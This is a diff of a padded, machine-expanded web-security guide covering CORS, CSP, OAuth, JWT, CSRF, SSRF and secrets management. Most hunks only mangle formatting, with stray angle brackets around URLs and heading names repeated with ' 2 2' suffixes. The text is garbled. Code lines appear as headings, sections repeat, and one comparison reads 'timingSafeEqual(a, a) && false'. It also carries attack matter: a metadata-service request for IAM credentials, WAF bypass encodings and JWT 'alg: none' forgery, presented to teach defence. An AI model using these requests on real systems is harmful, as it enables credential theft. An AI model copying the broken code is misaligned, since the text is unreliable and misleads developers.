-origin: ['<<<<<https://example.com',>>>>> '<<<<<https://app.example.com'>>>>],>
+origin: ['<<<<<<https://example.com',>>>>>> '<<<<<<https://app.example.com'>>>>>],>
 methods: ['GET', 'POST', 'PUT', 'DELETE'],
 credentials: true,
 maxAge: 86400
@@ -539,7 +1039,7 @@ Access-Control-Max-Age: 86400
 
 ## Hashing vs Encryption
 
-| | Hashing | Encryption |
+|  | Hashing | Encryption |
 |---|---------|------------|
 | Reversible | No | Yes |
 | Use case | Passwords | Data storage |
@@ -784,11 +1284,11 @@ Re-validate based on context changes
 
     Content-Security-Policy:
 default-src 'self';
-script-src 'self' 'unsafe-inline' <<<<<https://cdn.example.com;>>>>>
+script-src 'self' 'unsafe-inline' <<<<<<https://cdn.example.com;>>>>>>
 style-src 'self' 'unsafe-inline';
 img-src 'self' data: https:;
-font-src 'self' <<<<<https://fonts.gstatic.com;>>>>>
-connect-src 'self' <<<<<https://api.example.com;>>>>>
+font-src 'self' <<<<<<https://fonts.gstatic.com;>>>>>>
+connect-src 'self' <<<<<<https://api.example.com;>>>>>>
 
 ## Directives Explained
 
@@ -892,9 +1392,9 @@ return apiKey;
 1. User clicks "Login with Google"
 2. Redirect to:
 
-       <<<<<https://accounts.google.com/oauth/authorize>>>>>
+       <<<<<<https://accounts.google.com/oauth/authorize>>>>>>
        ?client_id=xxx
-       &redirect_uri=<<<<<https://myapp.com/callback>>>>>
+       &redirect_uri=<<<<<<https://myapp.com/callback>>>>>>
        &response_type=code
 &scope=email profile
        &state=random_csrf_token
@@ -902,11 +1402,11 @@ return apiKey;
 1. User logs in, consents
 2. Google redirects to:
 
-       <<<<<https://myapp.com/callback?code=xxx&state=xxx>>>>>
+       <<<<<<https://myapp.com/callback?code=xxx&state=xxx>>>>>>
 
 3. Server exchanges code for tokens:
 
-POST <<<<<https://oauth2.googleapis.com/token>>>>>
+POST <<<<<<https://oauth2.googleapis.com/token>>>>>>
 { code, client_id, client_secret, redirect_uri }
 
 1. Server receives: { access_token, refresh_token, id_token }
@@ -963,6 +1463,7 @@ Any XSS can steal it.
 
 ```yaml
 SCENARIO:
+
 1. You have: app.example.com CNAME -> something.herokuapp.com
 2. You stop using Heroku, dont remove DNS
 3. Attacker claims that Heroku app name
@@ -1016,6 +1517,7 @@ dig app.example.com CNAME
 ## Common Bypass Attempts
 
 ```text
+
 1. IP ROTATION
 - Use Cloudflare, VPN detection
 - Rate limit by user ID when authenticated
@@ -1280,6 +1782,7 @@ sameSite: 'strict'  // Prevents CSRF
 ## Double Submit Pattern
 
 ```text
+
 1. Set CSRF token in cookie (httpOnly: false)
 2. Client reads cookie, sends in header
 3. Server compares cookie vs header
@@ -1472,7 +1975,7 @@ curl -I <<<<<https://example.com>>>>>
 
 ---
 
-## VOLUME 1: THE SCARS (THE "WHY")
+## VOLUME 1: THE SCARS (THE "WHY") 2
 
 ## 1. THE "LOG4SHELL" (CVE-2021-44228)
 
@@ -1505,13 +2008,13 @@ Capital One used a WAF on AWS EC2.
 **The Vulnerability**:
 The WAF had a misconfiguration allowing it to query the AWS Metadata Service (`169.254.169.254`).
 **The Attack**:
-Attacker sent a request to the WAF: `?url=<<<<<http://169.254.169.254/latest/meta-data/iam/security-credentials/`.>>>>>
+Attacker sent a request to the WAF: `?url=<<<<<<http://169.254.169.254/latest/meta-data/iam/security-credentials/`.>>>>>>
 The WAF fetched the URL and returned the **AWS IAM Role Credentials**to the attacker.**The Result**:
 Attacker used the credentials to sync 700 S3 buckets containing 100M credit card applications.
 **The Fix**:
 **IMDSv2**. Require a session token for metadata access (blocks SSRF).
 
-## VOLUME 2: THE FOUNDATION (THE "WHAT")
+## VOLUME 2: THE FOUNDATION (THE "WHAT") 2
 
 ## 5. ZERO TRUST ARCHITECTURE
 
@@ -1547,21 +2050,21 @@ The standard for Mobile/SPA.
 1. **App**: Redirects user to `auth.com/authorize?code_challenge=xyz`.
 2. **User**: Logs in.
 3. **Auth Server**: Redirects back to `app.com/callback?code=123`.
-4. **App**: Swaps `code` + `code_verifier` for `access_token`.
+4. **App**: Swaps `code`+`code_verifier`for`access_token`.
 
 - **Why PKCE?**: Prevents Code Interception attacks.
 
 **Client Credentials Flow**:
 Machine-to-Machine (M2M).
 
-1. **Service**: Sends `client_id` + `client_secret`.
+1. **Service**: Sends `client_id`+`client_secret`.
 2. **Auth Server**: Returns `access_token`.
 
 - **Warning**: Never use this in a browser/mobile app.
 
 ---
 
-## VOLUME 3: THE DEEP DIVE (THE "HOW")
+## VOLUME 3: THE DEEP DIVE (THE "HOW") 2
 
 ## 9. JWT SECURITY
 
@@ -1578,7 +2081,7 @@ JWTs are stateless. If an attacker steals one, they are the user until it expire
 
 **Algorithm Confusion Attack**:
 
-- Attacker changes header `alg: HS256` (Symmetric) to `alg: None`.
+- Attacker changes header `alg: HS256`(Symmetric) to`alg: None`.
 
 - Some libraries accept it and skip signature verification.
 
@@ -1602,7 +2105,7 @@ Inspects HTTP traffic at Layer 7.
 
 **Bypass Techniques**:
 
-- **Encoding**: `%3Cscript%3E` (URL Encode), `\u003c` (Unicode).
+- **Encoding**: `%3Cscript%3E`(URL Encode),`\u003c` (Unicode).
 
 - **Case**: `SeLeCt * FrOm`.
 
@@ -1610,7 +2113,7 @@ Inspects HTTP traffic at Layer 7.
 
 ---
 
-## VOLUME 4: THE EXPERT (THE "SCALE")
+## VOLUME 4: THE EXPERT (THE "SCALE") 2
 
 ## 13. SECRET MANAGEMENT
 
@@ -1656,7 +2159,7 @@ Detects abnormal behavior in containers.
 
 ---
 
-## VOLUME 5: THE TITAN (THE "KERNEL")
+## VOLUME 5: THE TITAN (THE "KERNEL") 2
 
 ## 16. MEMORY SAFETY
 
@@ -1695,7 +2198,7 @@ Send encrypted medical data to the cloud. Cloud runs AI analysis. Cloud returns 
 
 ---
 
-## VOLUME 6: THE INFINITE (THE "FUTURE")
+## VOLUME 6: THE INFINITE (THE "FUTURE") 2
 
 ## 19. QUANTUM-SAFE CRYPTOGRAPHY
 
@@ -1703,9 +2206,7 @@ Send encrypted medical data to the cloud. Cloud runs AI analysis. Cloud returns 
 
 **The Threat**:
 Shor's Algorithm on a Quantum Computer can factor large integers efficiently.
-**RSA**and**Elliptic Curve (ECC)** will be broken.
-
-**NIST Finalists (The Replacements)**:
+**RSA**and**Elliptic Curve (ECC)**will be broken.**NIST Finalists (The Replacements)**:
 
 1. **Kyber**(Key Encapsulation): Lattice-based.
 2. **Dilithium**(Digital Signatures): Lattice-based.
@@ -2994,6 +3495,7 @@ return count < limit;
 ## Pen Test Phases
 
 ```text
+
 1. RECONNAISSANCE
 - Gather public info
 - DNS records, subdomains
@@ -3077,6 +3579,7 @@ OUT OF SCOPE:
 ## Response Steps
 
 ```text
+
 1. DETECT & IDENTIFY
 - What is happening?
 - When did it start?
@@ -3128,6 +3631,7 @@ OUT OF SCOPE:
 ## Rotation Strategy
 
 ```sql
+
 1. GENERATE new secret
 2. CONFIGURE both old and new secrets valid
 3. UPDATE all consumers to use new
@@ -3169,6 +3673,7 @@ return JSON.parse(response.SecretString);
 CHALLENGE: Zero-downtime rotation
 
 STEPS:
+
 1. Create new user with same permissions
 2. Update app to use new credentials
 3. Wait for connection pool refresh
@@ -3191,6 +3696,7 @@ OR use dual-password support:
 ## Stateless JWT Flow
 
 ```text
+
 1. User logs in with credentials
 2. Server validates, creates JWT
 3. JWT contains: { userId, role, exp }
@@ -3454,7 +3960,7 @@ req.session.userId = user.id;
 ## Idle Timeout
 
 ```javascript
-const SESSION_IDLE_TIMEOUT = 30 * 60 * 1000; // 30 min
+const SESSION_IDLE_TIMEOUT = 30 *60* 1000; // 30 min
 
 app.use((req, res, next) => {
 if (req.session.lastActivity) {
@@ -3492,14 +3998,14 @@ Cannot be undone easily!
 
 ---
 
-## Content-Security-Policy
+## Content-Security-Policy 2
 
     Content-Security-Policy:
 default-src 'self';
-script-src 'self' 'unsafe-inline' <<<<<https://cdn.example.com;>>>>>
+script-src 'self' 'unsafe-inline' <<<<<<https://cdn.example.com;>>>>>>
 style-src 'self' 'unsafe-inline';
 img-src 'self' data: https:;
-connect-src 'self' <<<<<https://api.example.com;>>>>>
+connect-src 'self' <<<<<<https://api.example.com;>>>>>>
 frame-ancestors 'none';
 base-uri 'self';
 form-action 'self';
@@ -3549,14 +4055,17 @@ WHY: Reduces attack surface
 
 ```yaml
 RECOMMENDED: Argon2id
+
 - Memory-hard (resistant to GPU attacks)
 - Modern, well-analyzed
 
 ACCEPTABLE: bcrypt
+
 - Proven, widely supported
 - 10+ rounds minimum
 
 AVOID:
+
 - MD5, SHA1, SHA256 (too fast!)
 - Plain bcrypt without salt
 - Custom hashing schemes
@@ -3825,6 +4334,7 @@ return result.count > 0;
 ## Recovery Flow
 
 ```text
+
 1. User loses device
 2. User clicks "Lost access"
 3. User enters backup code
@@ -4126,7 +4636,7 @@ if (isRevoked) throw new Error('Token revoked');
 const tokens = generateTokens(payload.sub);
 
 // Rotate refresh token
-await redis.set(`revoked:${refreshToken}`, '1', 'EX', 7 * 24 * 60 * 60);
+await redis.set(`revoked:${refreshToken}`, '1', 'EX', 7 *24* 60 * 60);
 
 res.cookie('refreshToken', tokens.refreshToken, {
 httpOnly: true,
@@ -4362,7 +4872,7 @@ const safe = escape(userInput);
 
 ## .env (defaults, committed)
 
-    NEXT_PUBLIC_APP_URL="<<<<<http://localhost:3000">>>>>
+    NEXT_PUBLIC_APP_URL="<<<<<<http://localhost:3000">>>>>>
 
 ## .env.production (production values)
 
@@ -4508,7 +5018,7 @@ res.cookie('session', token, {
 httpOnly: true,  // JS can't read it (XSS protection)
 secure: true,  // HTTPS only
 sameSite: 'lax',    // CSRF protection
-maxAge: 7 * 24 * 60 * 60 * 1000,  // 7 days
+maxAge: 7 *24* 60 *60* 1000,  // 7 days
 path: '/',
 domain: '.myapp.com'  // Subdomain sharing
 });
@@ -4815,7 +5325,7 @@ detect-secrets scan
 
 ## TERRIBLE - Fetches any URL
 
-requests.get(user_provided_url) # Can access <<<<<http://169.254.169.254/>>>>>
+requests.get(user_provided_url) # Can access <<<<<<http://169.254.169.254/>>>>>>
 
 ## EXCELLENT - Block internal IPs
 
@@ -4976,7 +5486,7 @@ const safeRegex = new RE2('^([a-zA-Z0-9]+)*$');
 
 ---
 
-## VOLUME 5: THE TITAN (THE "KERNEL") 2
+## VOLUME 5: THE TITAN (THE "KERNEL") 2 2
 
 ## 16. MEMORY SAFETY 2
 
@@ -5009,7 +5519,7 @@ Perform math on the encrypted data itself.
 Send encrypted medical data to the cloud. Cloud runs AI analysis. Cloud returns encrypted result. Cloud *never* sees the data.
 **Libraries**: Microsoft SEAL, OpenFHE.
 
-## VOLUME 6: THE INFINITE (THE "FUTURE") 2
+## VOLUME 6: THE INFINITE (THE "FUTURE") 2 2
 
 ## 19. QUANTUM-SAFE CRYPTOGRAPHY 2
 
@@ -6659,7 +7169,7 @@ PRELOAD: Submit to browser preload list
 CAUTION: Test thoroughly before enabling
 Cannot be undone easily!
 
-## Content-Security-Policy 2
+## Content-Security-Policy 2 2
 
     Content-Security-Policy:
 default-src 'self';
@@ -7853,7 +8363,7 @@ const safeRegex = new RE2('^([a-zA-Z0-9]+)*$');
 
 **Titan Fix:** Explicit Deny with StringNotLike on aws:PrincipalArn.
 
-### END OF VOLUME 1.4: ADDITIONAL SECURITY SCARS
+### END OF VOLUME 1.4: ADDITIONAL SECURITY SCARS 2
 
 ## VOLUME 1.5: TITAN VAULT - SUPPLY CHAIN & IDENTITY ATTACKS
 
@@ -7886,7 +8396,7 @@ return jwt.decode(
         public_key,
 algorithms=["RS256"], # NEVER include HS256
         audience="my-app",
-        issuer="<<<<<https://auth.company.com">>>>>
+        issuer="<<<<<<https://auth.company.com">>>>>>
         )
 except jwt.InvalidAlgorithmError:
 raise SecurityException("Algorithm mismatch - possible attack")
@@ -7923,7 +8433,7 @@ userAgent: req.headers['user-agent'],
 nonce: nonce
         }));
 
-const authUrl = new URL('<<<<<https://idp.example.com/authorize>>>>>');
+const authUrl = new URL('<<<<<<https://idp.example.com/authorize>>>>>>');
 authUrl.searchParams.set('response_type', 'code');
 authUrl.searchParams.set('client_id', CLIENT_ID);
 authUrl.searchParams.set('redirect_uri', REDIRECT_URI);
@@ -7991,8 +8501,8 @@ throw new SecurityException("Nonce mismatch - replay attack");
 ## pip.conf
 
 [global]
-index-url = <<<<<https://pypi.mycompany.com/simple/>>>>>
-extra-index-url = <<<<<https://pypi.org/simple/>>>>>
+index-url = <<<<<<https://pypi.mycompany.com/simple/>>>>>>
+extra-index-url = <<<<<<https://pypi.org/simple/>>>>>>
 
 ## CRITICAL: Prefer private index
 
@@ -8349,7 +8859,7 @@ config = yaml.load(user_input, Loader=SafeLoader)
 
 <!-- VIBE: Overly permissive CSP -->
 <meta http-equiv="Content-Security-Policy"
-content="script-src 'self' https://cdn.example.com">
+content="script-src 'self' <https://cdn.example.com">>
 <!-- Attacker finds JSONP on cdn.example.com XSS -->
 
 <!-- TITAN: Strict nonce-based CSP -->
@@ -8552,7 +9062,7 @@ return jwt.decode(token, key, algorithms=[header['alg']])
 
 ## TIMING ATTACKS AGAINST STRING COMPARISON
 
-## The Scar
+## The Scar 2
 
 > "Deployed to production. Image pulled from registry.
 > Someone had pushed a backdoored image with same tag.
@@ -8624,7 +9134,7 @@ return argon2.verify(provided, hashed)
 
 ## const b = Buffer.from(stored);
 
-#
+#  2
 
 ## 2
 
@@ -8642,11 +9152,11 @@ return argon2.verify(provided, hashed)
 
 ## return crypto.timingSafeEqual(a, b);
 
-## } 2
+## } 2 2
 
 ## REDOS - REGEX DENIAL OF SERVICE
 
-## The Scar 2
+## The Scar 2 2
 
 > "Email validation regex: ^([a-zA-Z0-9]+)+@example.com$
 > Attacker input: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaa!'
@@ -8861,7 +9371,7 @@ buffer[sizeof(buffer) - 1] = '\0';  // Ensure null termination
 
 ## JWT SECURITY PITFALLS
 
-### The Scar
+### The Scar 3 2
 
 > "JWT token validated signature. Accepted `alg: none`.
 > Attacker removes signature, sets alg to 'none'.
@@ -8956,7 +9466,7 @@ await this.tokenStore.save({
 id: tokenId,
         userId,
 createdAt: new Date(),
-expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),  // 7 days
+expiresAt: new Date(Date.now() + 7 *24* 60 *60* 1000),  // 7 days
         });
 
 return jwt.sign(
@@ -8992,7 +9502,7 @@ refreshToken: this.createRefreshToken(decoded.sub),
 
 ## SECRETS MANAGEMENT WITH VAULT
 
-### The Scar
+### The Scar 4 2
 
 > "API keys in .env file. Committed to GitHub.
 > Private repo. Then made public for portfolio.
@@ -9349,7 +9859,7 @@ return secrets.compare_digest(
 
 ## DEPENDENCY VULNERABILITY DISASTERS
 
-### The Scar
+### The Scar 5 2
 
 > "Log4Shell announced. Checked: we use log4j.
 > Where? 47 different services. Transitive dependency.
@@ -9551,7 +10061,7 @@ message = {
 "type": "section",
 "text": {
 "type": "mrkdwn",
-| "text": f"*Critical:* {len(critical)} | *High:* {len(high)}" |
+| "text": f"*Critical:*{len(critical)} | *High:* {len(high)}" |
         }
         }
         ]
@@ -9636,6 +10146,7 @@ cosign sign --yes \
 ghcr.io/${{ github.repository }}@${{ steps.build.outputs.digest }}
 
 ## Attest SBOM
+
 - name: Attest SBOM
 | run: |
 cosign attest --yes \
@@ -9679,13 +10190,13 @@ background: false
 - entries:
 - keyless:
 
-issuer: "<<<<<https://token.actions.githubusercontent.com">>>>>
-subject: "<<<<<https://github.com/company/*/.github/workflows/*">>>>>
+issuer: "<<<<<<https://token.actions.githubusercontent.com">>>>>>
+subject: "<<<<<<https://github.com/company/*/.github/workflows/*">>>>>>
         rekor:
-url: <<<<<https://rekor.sigstore.dev>>>>>
+url: <<<<<<https://rekor.sigstore.dev>>>>>>
         attestations:
 
-- predicateType: <<<<<https://spdx.dev/Document>>>>>
+- predicateType: <<<<<<https://spdx.dev/Document>>>>>>
 
         conditions:
 
@@ -9760,7 +10271,7 @@ return sanitized;
 
 ---
 
-### XSS Prevention
+### XSS Prevention 2 2
 
 ```typescript
 // ? TITAN: Production XSS prevention
@@ -10286,7 +10797,7 @@ Error: MISSING_NEXTAUTH_API_ROUTE_ERROR
 
 ```text
 
-### Fix
+### Fix 2
 
 ```bash
 
@@ -10370,7 +10881,7 @@ return session;
 
 session: {
 strategy: "jwt",
-maxAge: 30 * 24 * 60 * 60  // 30 days
+maxAge: 30 *24* 60 * 60  // 30 days
   },
 
 pages: {
@@ -10573,7 +11084,7 @@ data: {
 userId: storedToken.userId,
 familyId: storedToken.familyId,  // Same family for reuse detection
 token: generateSecureToken(),
-expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)  // 7 days
+expiresAt: new Date(Date.now() + 7 *24* 60 *60* 1000)  // 7 days
     }
   });
 
@@ -10612,7 +11123,7 @@ res.cookie('accessToken', accessToken, {
 httpOnly: true,   // JavaScript cannot read
 secure: true,  // HTTPS only
 sameSite: 'lax',  // CSRF protection
-maxAge: 15 * 60 * 1000,  // 15 minutes
+maxAge: 15 *60* 1000,  // 15 minutes
 path: '/'
 });
 
@@ -10620,7 +11131,7 @@ res.cookie('refreshToken', refreshToken, {
 httpOnly: true,
 secure: true,
 sameSite: 'strict',  // More restrictive for refresh
-maxAge: 7 * 24 * 60 * 60 * 1000,  // 7 days
+maxAge: 7 *24* 60 *60* 1000,  // 7 days
 path: '/api/auth/refresh'  // Only sent to refresh endpoint
 });
 
@@ -10781,7 +11292,7 @@ cors: 'credentials: include with specific origins',
 
 ---
 
-## SQL INJECTION PREVENTION
+## SQL INJECTION PREVENTION 2
 
 ```typescript
 // ? VIBE: String concatenation = SQL Injection!
@@ -10797,9 +11308,7 @@ where: { email }  // Safe - Prisma escapes automatically
 });
 
 // Raw SQL with parameterized query
-const user = await prisma.$queryRaw`
-SELECT * FROM users WHERE email = ${email}
-`; // Safe - parameterized
+const user = await prisma.$queryRaw`SELECT * FROM users WHERE email = ${email}`; // Safe - parameterized
 
 // Node.js with pg
 const { rows } = await pool.query(
@@ -11009,7 +11518,7 @@ SECURITY CHECK
 
 ## REAL INPUT VALIDATION PATTERNS 2024
 
-## SQL Injection Prevention 2
+## SQL Injection Prevention 2 2
 
 // NEVER do this
 const query = `SELECT *FROM users WHERE id = ${userId}`;
@@ -11064,7 +11573,7 @@ script-src 'self' 'unsafe-eval' 'unsafe-inline';
 style-src 'self' 'unsafe-inline';
 img-src 'self' blob: data:;
 font-src 'self';
-connect-src 'self' <<<<<https://api.example.com;>>>>>`.replace(/\s+/g, ' ').trim()
+connect-src 'self' <<<<<<https://api.example.com;>>>>>>`.replace(/\s+/g, ' ').trim()
   }
 ];
 
@@ -11787,7 +12296,7 @@ raise ConcurrentModificationError("Retry required")
 
 ## JWT NONE ALGORITHM ATTACK 2
 
-### The Scar 5
+### The Scar 5 2 2
 
 > "JWT library accepts 'alg': 'none'.
 > Attacker forges token without signature. Backend trusts it.
@@ -11942,13 +12451,13 @@ return argon2.verify(provided, hashed)
 
 ## return crypto.timingSafeEqual(a, a) && false; 2
 
-## } 3
+## } 3 2
 
 ## 6
 
 ## return crypto.timingSafeEqual(a, b); 2
 
-## } 4
+## } 4 2
 
 ## REDOS - REGEX DENIAL OF SERVICE 2
 
@@ -12157,7 +12666,7 @@ buffer[sizeof(buffer) - 1] = '\0';  // Ensure null termination
 
 ## JWT SECURITY PITFALLS 2
 
-### The Scar 6
+### The Scar 6 2
 
 > "JWT token validated signature. Accepted `alg: none`.
 > Attacker removes signature, sets alg to 'none'.
@@ -12283,7 +12792,7 @@ refreshToken: this.createRefreshToken(decoded.sub),
 
 ## SECRETS MANAGEMENT WITH VAULT 2
 
-### The Scar 7
+### The Scar 7 2
 
 > "API keys in .env file. Committed to GitHub.
 > Private repo. Then made public for portfolio.
@@ -12629,7 +13138,7 @@ return secrets.compare_digest(
 
 ## DEPENDENCY VULNERABILITY DISASTERS 2
 
-### The Scar 8
+### The Scar 8 2
 
 > "Log4Shell announced. Checked: we use log4j.
 > Where? 47 different services. Transitive dependency.
@@ -12968,509 +13477,109 @@ value: "2024-01-01T00:00:00Z"
 
 ## VOLUME 8: DATABASE REPLICATION PATTERNS
 
-## Table of Contents
-
-- [TABLE OF CONTENTS](#table-of-contents)
-- [Production-Grade Authentication, Encryption, and OWASP](#production-grade-authentication-encryption-and-owasp)
-- [?? ADVANCED SECURITY PATTERNS](#-advanced-security-patterns)
-- [OWASP Top 10 Prevention](#owasp-top-10-prevention)
-  - [1. Injection](#1-injection)
-  - [2. Broken Authentication](#2-broken-authentication)
-  - [3. XSS Prevention](#3-xss-prevention)
-  - [4. CSRF Protection](#4-csrf-protection)
-- [Security Headers](#security-headers)
-  - [Essential Headers](#essential-headers)
-  - [Helmet.js (Express)](#helmetjs-express)
-- [Password Security](#password-security)
-  - [Hashing](#hashing)
-  - [Password Requirements](#password-requirements)
-- [API Security](#api-security)
-  - [Rate Limiting](#rate-limiting)
-  - [Input Validation](#input-validation)
-- [Secrets Management](#secrets-management)
-  - [Environment Variables](#environment-variables)
-- [Secret Rotation](#secret-rotation)
-- [Audit Logging](#audit-logging)
-  - [What to Log](#what-to-log)
-  - [Log Format](#log-format)
-- [?? AUTHENTICATION DEEP DIVE](#-authentication-deep-dive)
-- [JWT Best Practices](#jwt-best-practices)
-  - [Token Structure](#token-structure)
-  - [Security Rules](#security-rules)
-- [Refresh Token Flow](#refresh-token-flow)
-- [OAuth 2.0 / OIDC](#oauth-20-oidc)
-  - [Common Providers](#common-providers)
-  - [Flows](#flows)
-- [Session Security](#session-security)
-  - [Cookie Settings](#cookie-settings)
-- [?? INPUT VALIDATION](#-input-validation)
-- [Validation Libraries](#validation-libraries)
-- [Zod Example](#zod-example)
-- [Sanitization](#sanitization)
-  - [Common Issues](#common-issues)
-  - [Solutions](#solutions)
-- [?? CORS EXPLAINED](#-cors-explained)
-- [How CORS Works](#how-cors-works)
-- [Simple vs Preflight](#simple-vs-preflight)
-  - [Simple Request (no preflight)](#simple-request-no-preflight)
-  - [Preflight Request](#preflight-request)
-- [Configuration](#configuration)
-  - [Express](#express)
-  - [Headers Explained](#headers-explained)
-- [Common Issues](#common-issues-2)
-- [?? ENCRYPTION PATTERNS](#-encryption-patterns)
-- [Encryption Types](#encryption-types)
-- [Hashing vs Encryption](#hashing-vs-encryption)
-- [Password Hashing](#password-hashing)
-  - [Never Do](#never-do)
-- [Data Encryption](#data-encryption)
-- [?? API SECURITY CHECKLIST](#-api-security-checklist)
-- [Authentication](#authentication)
-- [Authorization](#authorization)
-- [Input Validation](#input-validation-4)
-- [Rate Limiting](#rate-limiting)
-- [Headers](#headers)
-- [Logging](#logging)
-- [?? ZERO TRUST SECURITY](#-zero-trust-security)
-- [Core Principles](#core-principles)
-- [Implementation](#implementation)
-  - [Everywhere Authentication](#everywhere-authentication)
-  - [Micro-segmentation](#micro-segmentation)
-  - [Continuous Verification](#continuous-verification)
-- [Context Factors](#context-factors)
-- [Technologies](#technologies)
-- [?? CONTENT SECURITY POLICY](#-content-security-policy)
-- [CSP Header](#csp-header)
-- [Directives Explained](#directives-explained)
-- [Nonce Pattern](#nonce-pattern)
-- [?? API KEY PATTERNS](#-api-key-patterns)
-- [Key Generation](#key-generation)
-- [Secure Storage](#secure-storage)
-- [Validation](#validation)
-- [?? OAUTH 2.0 FLOWS](#-oauth-20-flows)
-- [Authorization Code Flow (Best for web apps)](#authorization-code-flow-best-for-web-apps)
-- [PKCE Flow (Best for SPAs/Mobile)](#pkce-flow-best-for-spasmobile)
-- [Token Storage](#token-storage)
-- [?? SUBDOMAIN TAKEOVER PREVENTION](#-subdomain-takeover-prevention)
-- [How Takeover Happens](#how-takeover-happens)
-- [Detection](#detection)
-- [Prevention Checklist](#prevention-checklist)
-- [?? RATE LIMIT BYPASS PREVENTION](#-rate-limit-bypass-prevention)
-- [Common Bypass Attempts](#common-bypass-attempts)
-- [Multi-Layer Limits](#multi-layer-limits)
-- [Response Pattern](#response-pattern)
-- [?? SECURE FILE UPLOAD](#-secure-file-upload)
-- [Validation Checklist](#validation-checklist)
-- [Content-Type Validation](#content-type-validation)
-- [Secure Filename](#secure-filename)
-- [Storage Path](#storage-path)
-- [?? DEPENDENCY SCANNING](#-dependency-scanning)
-- [npm audit](#npm-audit)
-- [Snyk Integration](#snyk-integration)
-- [Automated Updates](#automated-updates)
-- [Supply Chain Security](#supply-chain-security)
-- [?? CSRF PREVENTION PATTERNS](#-csrf-prevention-patterns)
-- [Token Pattern](#token-pattern)
-- [SameSite Cookies](#samesite-cookies)
-- [Double Submit Pattern](#double-submit-pattern)
-- [?? XSS PREVENTION PATTERNS](#-xss-prevention-patterns)
-- [Output Encoding](#output-encoding)
-- [React Protection](#react-protection)
-- [Context-Specific Encoding](#context-specific-encoding)
-- [CSP as Defense in Depth](#csp-as-defense-in-depth)
-- [?? SECURE HEADERS CONFIGURATION](#-secure-headers-configuration)
-- [Essential Headers](#essential-headers-2)
-- [Header Reference](#header-reference)
-- [Verification](#verification)
-- [07_SECURITY.MD: THE TITAN GUIDE (25K TARGET)](#07_securitymd-the-titan-guide-25k-target)
-- [Production-Grade Zero Trust, Cryptography, and Pentesting](#production-grade-zero-trust-cryptography-and-pentesting)
-  - [**VOLUME 1: THE SCARS (The "Why")**](#volume-1-the-scars-the-why)
-  - [**VOLUME 2: THE FOUNDATION (The "What")**](#volume-2-the-foundation-the-what)
-  - [**VOLUME 3: THE DEEP DIVE (The "How")**](#volume-3-the-deep-dive-the-how)
-  - [**VOLUME 4: THE EXPERT (The "Scale")**](#volume-4-the-expert-the-scale)
-  - [**VOLUME 5: THE TITAN (The "Kernel")**](#volume-5-the-titan-the-kernel)
-  - [**VOLUME 6: THE INFINITE (The "Future")**](#volume-6-the-infinite-the-future)
-- [VOLUME 1: THE SCARS (THE "WHY")](#volume-1-the-scars-the-why)
-  - [1. THE "LOG4SHELL" (CVE-2021-44228)](#1-the-log4shell-cve-2021-44228)
-    - [The Internet on Fire](#the-internet-on-fire)
-  - [4. THE "CAPITAL ONE BREACH"](#4-the-capital-one-breach)
-    - [SSRF (Server Side Request Forgery)](#ssrf-server-side-request-forgery)
-- [VOLUME 2: THE FOUNDATION (THE "WHAT")](#volume-2-the-foundation-the-what)
-  - [5. ZERO TRUST ARCHITECTURE](#5-zero-trust-architecture)
-    - [Never Trust, Always Verify](#never-trust-always-verify)
-  - [6. OAUTH2 & OIDC](#6-oauth2-oidc)
-    - [Authentication Flows Deep Dive](#authentication-flows-deep-dive)
-- [VOLUME 3: THE DEEP DIVE (THE "HOW")](#volume-3-the-deep-dive-the-how)
-  - [9. JWT SECURITY](#9-jwt-security)
-    - [Signing & Revocation](#signing-revocation)
-  - [10. WAF (WEB APPLICATION FIREWALL)](#10-waf-web-application-firewall)
-    - [Rules & Bypass](#rules-bypass)
-- [VOLUME 4: THE EXPERT (THE "SCALE")](#volume-4-the-expert-the-scale)
-  - [13. SECRET MANAGEMENT](#13-secret-management)
-    - [Vault & AWS Secrets Manager](#vault-aws-secrets-manager)
-  - [14. CONTAINER SECURITY](#14-container-security)
-    - [Distroless & Runtime Security](#distroless-runtime-security)
-- [VOLUME 5: THE TITAN (THE "KERNEL")](#volume-5-the-titan-the-kernel-2)
-  - [16. MEMORY SAFETY](#16-memory-safety)
-    - [Rust vs C++](#rust-vs-c)
-  - [18. HOMOMORPHIC ENCRYPTION](#18-homomorphic-encryption)
-    - [Compute on Encrypted Data](#compute-on-encrypted-data)
-- [VOLUME 6: THE INFINITE (THE "FUTURE")](#volume-6-the-infinite-the-future-2)
-  - [19. QUANTUM-SAFE CRYPTOGRAPHY](#19-quantum-safe-cryptography)
-    - [Post-Quantum Algorithms](#post-quantum-algorithms)
-- [VOLUME 7: THE APPENDIX (TITAN REFERENCE)](#volume-7-the-appendix-titan-reference)
-  - [A. THE ULTIMATE SECURITY HEADERS](#a-the-ultimate-security-headers)
-  - [B. THE PENTEST CHECKLIST](#b-the-pentest-checklist)
-- [KEYWORD REFERENCE INDEX](#keyword-reference-index)
-  - [Each line = 100x LLM expansion potential](#each-line-100x-llm-expansion-potential)
-- [OWASP TOP 10 (2021)](#owasp-top-10-2021)
-- [AUTHENTICATION](#authentication-1)
-- [AUTHORIZATION](#authorization-1)
-- [WEB SECURITY](#web-security)
-- [CRYPTOGRAPHY](#cryptography)
-- [APPLICATION SECURITY](#application-security)
-- [INFRASTRUCTURE SECURITY](#infrastructure-security)
-- [THREAT MODELING](#threat-modeling)
-- [SECURITY OPERATIONS](#security-operations)
-- [PENETRATION TESTING](#penetration-testing)
-  - [END OF KEYWORD REFERENCE](#end-of-keyword-reference)
-- [ADVANCED CRYPTOGRAPHY DEEP ATLAS](#advanced-cryptography-deep-atlas)
-  - [Each keyword = expandable implementation](#each-keyword-expandable-implementation)
-  - [Modern Ciphers](#modern-ciphers)
-  - [Key Management](#key-management)
-  - [Digital Signatures](#digital-signatures)
-  - [Post-Quantum](#post-quantum)
-- [WEB SECURITY DEEP ATLAS](#web-security-deep-atlas)
-  - [Each keyword = expandable defense](#each-keyword-expandable-defense)
-  - [CSP Advanced](#csp-advanced)
-  - [Cookie Security](#cookie-security)
-  - [CORS](#cors)
-  - [Headers](#headers-1)
-- [APPLICATION SECURITY DEEP ATLAS](#application-security-deep-atlas)
-  - [Each keyword = expandable technique](#each-keyword-expandable-technique)
-  - [SAST](#sast)
-  - [DAST](#dast)
-  - [IAST](#iast)
-  - [SCA](#sca)
-- [CLOUD SECURITY DEEP ATLAS](#cloud-security-deep-atlas)
-  - [Each keyword = expandable configuration](#each-keyword-expandable-configuration)
-  - [IAM](#iam)
-  - [Network](#network)
